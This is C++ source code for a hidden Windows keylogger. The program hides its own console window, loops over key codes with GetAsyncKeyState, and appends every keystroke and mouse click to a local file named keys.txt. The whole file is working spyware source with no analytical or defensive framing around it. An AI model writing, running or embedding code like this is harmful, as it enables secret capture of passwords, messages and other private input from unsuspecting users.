#include<iostream>
#include<Windows.h> //windows API
#include<fstream> //std::fstream

using namespace std;

string getKeySign(char key){
  switch(key){
    case VK_LBUTTON:
      return "*CLICK*";
      break;
    case VK_RBUTTON:
      return "*RIGHT_CLICK*";
      break;
    case VK_RETURN:
      return "\n";
      break;
    case VK_CAPITAL:
      return "*CAPS*";
      break;
    default: return ""; break;
  }
}

void logKey(char key){
  fstream file;
  file.open("keys.txt",fstream::app);
  file << key;
  file.close();
}

void logString(string s){
  fstream file;
  file.open("keys.txt",fstream::app);
  file << s;
  file.close();
}

int main(){

  //declare window handler
  HWND windowHandler;
  SetConsoleTitle("Logger");
  windowHandler = FindWindowA(NULL,"Logger");

  //hide our key logger
  ShowWindow(windowHandler,SW_HIDE);

  char key;

  while(true){
    bool caps = false;
    //cycle through all int key codes
    Sleep(10);
    for(key = 8; key <= 190; key++){
      //-32767 means dont keep printing it out
      if(GetAsyncKeyState(key) == -32767){
        string s = getKeySign(key);
        if(s==""){
          char mappedChar = MapVirtualKey(key,MAPVK_VK_TO_CHAR);
          if(caps){
            char toLog = (char) toupper(mappedChar);
            logKey(toLog);
          }else{
            char toLog = (char) tolower(mappedChar);
            logKey(toLog);
          }
        }else{
          if(s=="*CAPS*"){
            caps = (caps) ? false: true;
          }else{
            logString(s);
          }
        }
      }
    }
  }
}
